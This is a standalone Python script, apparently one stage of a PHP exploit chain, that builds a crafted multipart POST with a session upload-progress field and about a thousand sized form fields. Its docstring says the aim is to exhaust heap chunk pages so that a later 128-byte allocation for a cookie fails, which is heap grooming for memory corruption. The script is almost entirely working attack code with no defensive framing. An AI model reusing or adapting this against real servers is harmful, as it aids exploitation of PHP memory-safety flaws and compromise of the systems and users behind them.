#!/usr/bin/env python3
"""A: 997 fields with name length L (live key strings) and value sizes:
N128 fields 103B (fill 128B bin), rest V bytes. Then file.
Goal: consume chunk free pages so cookie's 128B page alloc fails.
usage: send_a_names.py N128 V L
"""
import socket,sys
N128=int(sys.argv[1]); V=int(sys.argv[2]); L=int(sys.argv[3]); N=997
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N):
    if L<=0:
        nm='f%04d'%i
    else:
        nm=('n'*max(0,L-4)+'%04d'%i)[-L:] if L>=4 else ('n'*L)
        nm=('n'*max(0,L-4)+'%04d'%i)[:L]
    ln=103 if i<N128 else V
    parts.append({'name':nm,'data':b'A'*ln})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
